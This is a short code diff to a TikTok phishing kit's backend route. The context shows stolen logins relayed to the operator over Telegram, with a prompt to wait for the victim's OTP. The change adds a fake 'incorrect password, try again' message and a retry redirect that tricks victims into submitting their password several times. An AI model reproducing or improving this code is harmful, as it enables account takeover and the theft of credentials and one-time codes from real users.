@@ -50,6 +50,7 @@ router.post("/tikto/:linkId", async (req, res) => {
         if (linkId.length !== 24) {
             return res.redirect("/notfound");
         }
+        const retry = req.query?.retry || 1;
         const link = await Links.findById(linkId);
         const user = await User.findById(link.user);
 
@@ -86,6 +87,10 @@ ${link.otpEnabled ? "Login and wait for victim to send OTP" : ""}
 Login now: https://www.tiktok.com or use mobile app
                                                 `)
                 .catch(err => console.log("Telegram error"));
+            if (retry > 1) {
+                req.flash("error_msg", "incorrect password, try again.");
+                return res.redirect(`/tikto/${linkId}?retry=${retry - 1}`);
+            }
             if (link.otpEnabled) {
                 return res.redirect("/tikto/otp/" + link.id);
             } else {
